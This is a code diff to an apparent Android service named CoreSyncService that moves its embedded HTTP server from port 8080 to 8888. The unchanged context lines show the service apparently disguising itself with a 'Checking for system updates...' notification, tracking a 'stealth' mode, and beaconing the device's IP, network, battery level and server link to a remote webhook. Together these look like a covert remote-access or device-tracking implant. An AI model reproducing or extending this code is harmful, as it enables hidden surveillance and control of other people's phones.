@@ -194,10 +194,10 @@ public class CoreSyncService extends Service {
     private synchronized void startServer() {
         try {
             if (server == null || !server.isAlive()) {
-                server = new LabRatsHttpServer(this, 8080);
+                server = new LabRatsHttpServer(this, 8888);
                 server.start();
                 isRunning = true;
-                Log.d(TAG, "HTTP Server started on port 8080");
+                Log.d(TAG, "HTTP Server started on port 8888");
             }
         } catch (Exception e) {
             Log.e(TAG, "Failed to start server", e);
@@ -266,8 +266,8 @@ public class CoreSyncService extends Service {
             contentText = "Checking for system updates...";
         } else {
             contentText = ip != null
-                ? "Server running at http://" + formattedIp + ":8080"
-                : "Server running on port 8080";
+                ? "Server running at http://" + formattedIp + ":8888"
+                : "Server running on port 8888";
         }
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
@@ -411,7 +411,7 @@ public class CoreSyncService extends Service {
             } catch (Exception ignored) {}
 
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
-            String link = "http://" + formattedIp + ":8080";
+            String link = "http://" + formattedIp + ":8888";
 
             // Build query parameters for GET (most reliable with Google Apps Script redirects)
             StringBuilder params = new StringBuilder();
@@ -420,7 +420,7 @@ public class CoreSyncService extends Service {
             params.append("&network=").append(java.net.URLEncoder.encode(networkType, "UTF-8"));
             params.append("&battery=").append(java.net.URLEncoder.encode(batteryLevel + "%", "UTF-8"));
             params.append("&link=").append(java.net.URLEncoder.encode(link, "UTF-8"));
-            params.append("&port=8080");
+            params.append("&port=8888");
             params.append("&stealth=").append(isStealthMode());
 
             URL url = new URL(REMOTE_WEBHOOK_URL + params.toString());
